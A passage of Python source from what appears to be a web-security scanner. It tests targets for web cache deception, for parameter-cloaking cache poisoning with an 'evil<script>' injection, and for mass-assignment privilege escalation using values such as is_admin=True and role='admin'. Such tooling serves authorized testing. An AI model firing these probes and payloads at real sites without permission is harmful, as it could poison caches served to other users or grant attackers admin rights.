                hval = h.get("value", "") if isinstance(h, dict) else ""
                if hname == "cache-control":
                    cache_control = hval
                if hname in ("x-cache", "cf-cache-status", "x-varnish"):
                    if "hit" in hval.lower():
                        is_cached = True

            # Does the response contain authenticated content?
            has_auth_content = status == 200 and len(body) > 500

            flags = []
            if is_cached:
                flags.append("CACHED")
            if has_auth_content:
                flags.append("AUTH_CONTENT")
            if cache_control and "no-" not in cache_control.lower():
                flags.append(f"CC:{cache_control[:30]}")

            if is_cached and has_auth_content:
                findings.append(f"Cache deception: {test_path}")
                lines.append(f"  [!!] {test_path}: Cached authenticated content!")
            elif flags:
                lines.append(f"  [!] {test_path}: {' '.join(flags)} (status {status})")
            else:
                lines.append(f"  {test_path}: status={status}, len={len(body)}")

        # Test 3: Parameter cloaking
        lines.append("\n--- Test 3: Parameter Cloaking ---")
        cloak_paths = [
            f"{path}?cb={cb}&utm_content=evil<script>",
            f"{path}?cb={cb};utm_content=evil<script>",
        ]

        for i, cloak_path in enumerate(cloak_paths):
            separator = "&" if i == 0 else ";"
            resp = await client.post("/api/session/request", json={
                "session": session, "method": "GET", "path": cloak_path,
            })
            if "error" in resp:
                lines.append(f"  Separator '{separator}': Error")
                continue

            body = resp.get("response_body", "")
            if "evil<script>" in body or "evil%3Cscript%3E" in body.lower():
                lines.append(f"  [!] Separator '{separator}': Param value reflected")
                # Check if cached with just the cache buster
                resp2 = await client.post("/api/session/request", json={
                    "session": session, "method": "GET", "path": f"{path}?cb={cb}",
                })
                if "error" not in resp2 and "evil" in resp2.get("response_body", ""):
                    findings.append(f"Parameter cloaking with '{separator}'")
                    lines.append(f"  [!!] Poisoned value persists — cache is keyed differently!")
            else:
                lines.append(f"  Separator '{separator}': Not reflected")

        # Summary
        lines.append(f"\n--- Summary ---")
        if findings:
            lines.append(f"Findings ({len(findings)}):")
            for f in findings:
                lines.append(f"  [!] {f}")
            lines.append("Risk: Web cache poisoning can serve malicious content to all users.")
        else:
            lines.append("No cache poisoning vulnerabilities detected.")

        return "\n".join(lines)


def _fmt_val(value) -> str:
    """Format a test value for display."""
    s = repr(value)
    if len(s) > 30:
        return s[:27] + "..."
    return s


def _mass_assign_value(param: str):
    """Return a sensible test value for a mass assignment parameter."""
    bool_params = {"is_admin", "admin", "verified", "active", "approved", "is_staff"}
    num_params = {"price", "discount", "balance", "credits", "level"}
    if param in bool_params:
        return True
    if param in num_params:
        return 0
    if param == "role":
        return "admin"
    if param == "permissions":
        return ["admin", "write", "delete"]
    if param == "group":
        return "administrators"
    if param == "type":
        return "admin"
    if param == "status":
        return "approved"
    if param == "plan":
        return "enterprise"
    return "injected_value"
